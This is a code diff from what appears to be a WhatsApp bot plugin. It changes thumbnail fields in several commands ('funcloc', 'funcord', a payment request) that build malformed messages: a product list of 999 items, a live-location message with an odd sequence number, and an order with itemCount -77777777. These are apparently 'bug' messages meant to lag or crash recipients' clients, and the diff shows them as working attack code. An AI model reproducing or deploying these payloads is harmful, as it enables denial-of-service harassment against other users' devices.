@@ -15,7 +15,7 @@ for (let i = 0; i < 999; i++) arr.push({ productId: '5164304847020057' })
 		sections: [], productListInfo: {
 			productSections: [{ title: ucapan, products: arr }],
 			headerImage: {
-				productId: '5164304847020057', jpegThumbnail: tumhiho
+				productId: '5164304847020057', jpegThumbnail: await conn.resize(logo, 300, 150)
 			},
 			businessOwnerJid: m.sender
 		},
@@ -31,7 +31,7 @@ if (command == 'funcloc') {
 let = prep = generateWAMessageFromContent(m.chat, { liveLocationMessage: { 
 degreesLatitude: 35.685506276233525, degreesLongitude: 139.75270667105852,
 caption: wm,
-sequenceNumber: 1656662972682001, timeOffset: 8600, jpegThumbnail: tumhiho
+sequenceNumber: 1656662972682001, timeOffset: 8600, jpegThumbnail: await conn.resize(logo, 300, 150)
 }}, { quoted: fakes })
 return conn.relayMessage(m.chat, prep.message, { messageId: prep.key.id })
 }
@@ -68,7 +68,7 @@ await conn.relayMessage(m.chat, { requestPaymentMessage: {
   requestFrom: m.sender,
   expiryTimestamp: 8600,
   amount: 10000,
-  background: tumhiho
+  background: await conn.resize(logo, 300, 150)
 }}}}, {})
 }
 
@@ -76,7 +76,7 @@ await conn.relayMessage(m.chat, { requestPaymentMessage: {
 if (command == 'funcord') {
 let prep = generateWAMessageFromContent(m.chat, { orderMessage: { 
 orderId: '5352482274766633',
-  thumbnail: tumhiho,
+  thumbnail: await conn.resize(logo, 300, 150),
   itemCount: -77777777,
   status: 1,
   surface: 1,
